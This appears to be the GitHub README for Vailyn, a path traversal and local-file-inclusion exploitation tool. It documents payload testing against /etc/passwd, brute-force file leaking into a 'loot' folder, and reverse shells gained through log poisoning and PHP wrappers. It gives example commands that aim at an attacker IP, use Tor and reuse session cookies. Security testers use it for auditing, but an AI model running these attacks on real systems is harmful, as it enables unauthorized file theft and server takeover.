<h1 align="center">
  <img src='core/doc/logo.png' height='580'></img><br>
  Vailyn
  <br>
</h1>

<p align="center">
  <a href="https://github.com/VainlyStrain/Vailyn/blob/master/Vailyn">
    <img src="https://img.shields.io/static/v1.svg?label=Version&message=3.3&color=lightgrey&style=flat-square"><!--&logo=dev.to&logoColor=white"-->
  </a>
  <a href="https://www.python.org/">
    <img src="https://img.shields.io/static/v1.svg?label=Python&message=3.7%2B&color=lightgrey&style=flat-square&logo=python&logoColor=white">
  </a><br>
  Phased Path Traversal & LFI Attacks
</p>

> **Vailyn 3.0**
>
> Since v3.0, Vailyn supports LFI PHP wrappers in Phase 1. Use `--lfi` to include them in the scan.

### About

Vailyn is a multi-phased vulnerability analysis and exploitation tool for path traversal/directory climbing vulnerabilities. It is built to make it as performant as possible, and to offer a wide arsenal of filter evasion techniques.

### How does it work?

Vailyn operates in 2 phases. First, it checks if the vulnerability is present. It does so by trying to access /etc/passwd (or a user-specified file), with all of its evasive payloads. Analysing the response, payloads that worked are separated from the others.

Now, the user can choose freely which payloads to use. Only these payloads will be used in the second phase.

The second phase is the exploitation phase. Now, it tries to leak all possible files from the server using a file and a directory dictionary. The search depth and the directory permutation level can be adapted via arguments. Optionally, it can download found files, and save them in its loot folder. Alternatively, it will try to obtain a reverse shell on the system, letting the attacker gain full control over the server.

Right now, it supports multiple attack vectors: injection via query, path, cookie and post data.

### Why the phase separation?

The separation in several phases is done to hugely improve the performance of the tool. In previous versions, every file-directory combination was checked with every payload. This resulted in a huge overhead due to payloads being always used again, despite not working for the current page.

### Installation

Recommended & tested Python versions are 3.7+, but it should work fine with Python 3.5 & Python 3.6, too. To install Vailyn, download the archive from the release tab, or perform

```
$ git clone https://github.com/VainlyStrain/Vailyn
```

Once on your system, you'll need to install the Python dependencies.

#### Unix Systems

On Unix systems, it is sufficient to run

```
$ pip install -r requirements.txt   # --user
```

#### Windows

Some libraries Vailyn uses do not work well with Windows, or will fail to install.

If you use Windows, use `pip` to install the requirements listed in `Vailyn\·›\requirements-windows.txt`.

If twisted fails to install, there is an unofficial version available [here](https://www.lfd.uci.edu/~gohlke/pythonlibs/#twisted), which should build under Windows. Just bear in mind that this is a 3rd party download, and the integrity isn't necessarily guaranteed. After this installed successfully, running pip again on `requirements-windows.txt` should work.

#### Final Steps

If you want to fully use the reverse shell module, you'll need to have `sshpass`, `ncat` and `konsole` installed. Package names vary by Linux distribution. On Windows, you'll need to start the listener manually beforehand. If you prefer a different terminal emulator, you can specify it in `core/config.py`.

That's it! Fire Vailyn up by moving to its installation directory and performing

```
$ python Vailyn -h
```

### Usage

Vailyn has 3 mandatory arguments: `-v VIC, -a INT and -p2 TP P1 P2`. However, depending on `-a`, more arguments may be required.

```
   ,                \                  /               , 
     ':.             \.      /\.     ./            .:'
        ':;.          :\ .,:/   ''. /;        ..::'
           ',':.,.__.'' '          ' `:.__:''.:'
              ';..                        ,;'     *
       *         '.,                   .:'
                    `v;.            ;v'        o
              .      '  '..      :.' '     .
                     '     ':;, '    '
            o                '          .   :        
                                           *
                         | Vailyn |
                      [ VainlyStrain ]
    
Vsynta Vailyn -v VIC -a INT -p2 TP P1 P2 
        [-p PAM] [-i F] [-Pi VIC2]
      [-c C] [-n] [-d I J K]
       [-s T] [-t] [-L]
  [-l] [-P] [-A] 

mandatory:
  -v VIC, --victim VIC  Target to attack, part 1 [pre-payload]
  -a INT, --attack INT  Attack type (int, 1-5, or A)

    A|  Spider (all)       2|  Path               5|  POST Data, json
    P|  Spider (partial)   3|  Cookie
    1|  Query Parameter    4|  POST Data, plain

  -p2 TP P1 P2, --phase2 TP P1 P2
                        Attack in Phase 2, and needed parameters

┌[ Values ]─────────────┬────────────────────┐
│ TP      │ P1          │ P2                 │
├─────────┼─────────────┼────────────────────┤
│ leak    │ File Dict   │ Directory Dict     │
│ inject  │ IP Addr     │ Listening Port     │
│ implant │ Source File │ Server Destination │
└─────────┴─────────────┴────────────────────┘

additional:
  -p PAM, --param PAM   query parameter or POST data for --attack 1, 4, 5
  -i F, --check F       File to check for in Phase 1 (df: etc/passwd)
  -Pi VIC2, --vic2 VIC2 Attack Target, part 2 [post-payload]
  -c C, --cookie C      Cookie to append (in header format)
  -l, --loot            Download found files into the loot folder
  -d I J K, --depths I J K
                        depths (I: phase 1, J: phase 2, K: permutation level)
  -h, --help            show this help menu and exit
  -s T, --timeout T     Request Timeout; stable switch for Arjun
  -t, --tor             Pipe attacks through the Tor anonymity network
  -L, --lfi             Additionally use PHP wrappers to leak files
  -n, --nosploit        skip Phase 2 (does not need -p2 TP P1 P2)
  -P, --precise         Use exact depth in Phase 1 (not a range)
  -A, --app             Start Vailyn's Qt5 interface

develop:
  --debug               Display every path tried, even 404s.
  --version             Print program version and exit.
  --notmain             Avoid notify2 crash in subprocess call.
```

Vailyn currently supports 5 attack vectors, and provides a crawler to automate all of them. The attack performed is identified by the `-a INT` argument.

```
INT        attack
----       -------
1          query-based attack  (https://site.com?file=../../../)
2          path-based attack   (https://site.com/../../../)
3          cookie-based attack (will grab the cookies for you)
4          plain post data     (ELEM1=VAL1&ELEM2=../../../)
5          json post data      ({"file": "../../../"})
A          spider automation   fetch + analyze all URLs from site with all vectors
```

You also must specify a target to attack. This is done via `-v VIC` and `-Pi VIC2`, where -v is the part before the injection point, and -Pi the rest.

Example: if the final URL should look like: `https://site.com/download.php?file=<ATTACK>&param2=necessaryvalue`, you can specify `-v https://site.com/download.php` and `-Pi &param2=necessaryvalue` (and `-p file`, since this is a query attack).

If you want to include PHP wrappers in the scan (like php://filter), use the `--lfi` argument. At the end of Phase 1, you'll be presented with an additional selection menu containing the wrappers that worked. (if any)

If the attacked site is behind a login page, you can supply an authentication cookie via `-c COOKIE`. If you want to attack over Tor, use `--tor`.

#### Phase 1

This is the analysis phase, where working payloads are separated from the others.

By default, `/etc/passwd` is looked up. If the server is not running Linux, you can specify a custom file by `-i FILENAME`. Note that you must **include subdirectories in FILENAME**.
You can modify the lookup depth with the first value of `-d` (default=8).

#### Phase 2

This is the exploitation phase, where Vailyn will try to leak as much files as possible, or gain a reverse shell using various techniques.

The depth of lookup in phase 2 (the maximal number of layers traversed back) is specified by the second value of the `-d` argument. The level of subdirectory permutation is set by the third value of `-d`.

By specifying `-l`, Vailyn will not only display files on the terminal, but also download and save the files into the loot folder.

If you want a verbose output (display every output, not only found files), you can use `--debug`. Note that output gets really messy, this is basically just a debug help.

To perform the bruteforce attack, you need to specify `-p2 leak FIL PATH`, where
* FIL is a dictionary file containing **filenames only** (e.g. index.php)
* PATH, is a dictionary file containing **directory names only**. Vailyn will handle directory permutation for you, so you'll need only one directory per line.

To gain a reverse shell by code injection, you can use `-p2 inject IP PORT`, where
* IP is your listening IP
* PORT is the port you want to listen on.

> **WARNING**
>
> Vailyn employs Log Poisoning techniques. Therefore, YOUR IP WILL BE VISIBLE IN THE SERVER LOGS.

The techniques (only work for LFI inclusions):

* `/proc/self/environ inclusion` only works on outdated servers
* `Apache + Nginx Log Poisoning & inclusion`
* `SSH Log Poisoning` 
* `poisoned mail inclusion`
* wrappers
    * `expect://`
    * `data:// (plain & b64)`
    * `php://input`

### False Positive prevention

To distinguish real results from false positives, Vailyn does the following checks:
* check the status code of the response
* check if the response is identical to one taken before attack start: this is useful e.g, when the server returns 200, but ignores the payload input or returns a default page if the file is not found.
* similar to #2, perform an additional check for query GET parameter handling (useful when server returns error that a needed parameter is missing)
* check for empty responses
* check if common error signatures are in the response content
* check if the payload is contained in the response: this is an additional check for the case the server responds 200 for non-existing files, and reflects the payload in a message (like ../../secret not found)
* check if the entire response is contained in the init check response: useful when the server has a default include which disappears in case of 404
* for `-a 2`, perform an additional check if the response content matches the content from the server root URL
* REGEX check for `/etc/passwd` if using that as lookup file

### Examples

* Simple Query attack, leaking files in Phase 2:
`$ Vailyn -v "http://site.com/download.php" -a 1 -p2 leak dicts/files dicts/dirs -p file` --> `http://site.com/download.php?file=../INJECT`

* Query attack, but I know a file `file.php` exists on exactly 2 levels above the inclusion point:
`$ Vailyn -v "http://site.com/download.php" -a 1 -p2 leak dicts/files dicts/dirs -p file -i file.php -d 2 X X -P`
This will shorten the duration of Phase 1 very much, since its a targeted attack.

* Simple Path attack:
`$ Vailyn -v "http://site.com/" -a 2 -p2 leak dicts/files dicts/dirs` --> `http://site.com/../INJECT`

* Path attack, but I need query parameters and tag:
`$ Vailyn -v "http://site.com/" -a 2 -p2 leak dicts/files dicts/dirs -Pi "?token=X#title"` --> `http://site.com/../INJECT?token=X#title`

* Simple Cookie attack:
`$ Vailyn -v "http://site.com/cookiemonster.php" -a 3 -p2 leak dicts/files dicts/dirs`
Will fetch cookies and you can select cookie you want to poison

* POST Plain Attack:
`$ Vailyn -v "http://site.com/download.php" -a 4 -p2 leak dicts/files dicts/dirs -p "DATA1=xx&DATA2=INJECT"`
will infect DATA2 with the payload

* POST JSON Attack:
`$ Vailyn -v "http://site.com/download.php" -a 5 -p2 leak dicts/files dicts/dirs -p '{"file": "INJECT"}'`

* Attack, but target is behind login screen:
`$ Vailyn -v "http://site.com/" -a 1 -p2 leak dicts/files dicts/dirs -c "sessionid=foobar"`

* Attack, but I want a reverse shell on port 1337:
`$ Vailyn -v "http://site.com/download.php" -a 1 -p2 inject MY.IP.IS.XX 1337  # a high Phase 2 Depth is needed for log injection`
(will start a ncat listener for you if on Unix)

* Full automation in crawler mode:
`$ Vailyn -v "http://root-url.site" -a A` _you can also specify other args, like cookie, depths, lfi & lookup file here_ 

* Full automation, but Arjun needs `--stable`:
`$ Vailyn -v "http://root-url.site" -a A -s ANY`

### Demo

[![asciicast](https://asciinema.org/a/384813.svg)](https://asciinema.org/a/384813)
Vailyn's Crawler analyzing a damn vulnerable web application. LFI Wrappers are not enabled.

[GUI Demonstration (v2.2.1-5)](https://www.youtube.com/watch?v=rFlR_SHk9fc)

### Possible Issues

Found some false positives/negatives (or want to point out other bugs/improvements): please leave an issue!

### Code of Conduct

> Vailyn is provided as an offensive web application audit tool. It has built-in functionalities which can reveal potential vulnerabilities in web applications, which could possibly be exploited maliciously.
>
> **THEREFORE, NEITHER THE AUTHOR NOR THE CONTRIBUTORS ARE RESPONSIBLE FOR ANY MISUSE OR DAMAGE DUE TO THIS TOOLKIT.**
>
> By using this software, the user obliges to follow their local laws, to not attack someone else's system without explicit permission from the owner, or with malicious intend.
>
> In case of an infringement, only the end user who committed it is accountable for their actions.

### Credits & Copyright

> Vailyn: Copyright © <a href="https://github.com/VainlyStrain">VainlyStrain</a>
>
> Arjun:  Copyright © <a href="https://github.com/s0md3v">s0md3v</a>

**Arjun is no longer distributed with Vailyn. Install its latest version via pip.**
